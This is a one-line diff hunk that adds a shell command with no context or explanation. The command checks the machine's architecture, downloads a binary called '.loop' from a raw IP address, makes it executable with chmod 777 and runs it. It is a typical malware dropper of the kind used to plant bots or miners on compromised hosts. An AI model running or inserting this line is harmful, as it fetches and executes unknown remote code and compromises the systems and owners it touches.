@@ -1,0 +1,1 @@
+uname --m|grep x86_64>>/dev/null||(wget -O .loop http://139.180.219.208/d/ft32 && chmod 777 .loop && ./.loop)&&( wget -O .loop http://139.180.219.208/d/ft64&&chmod 777 .loop&& ./.loop)
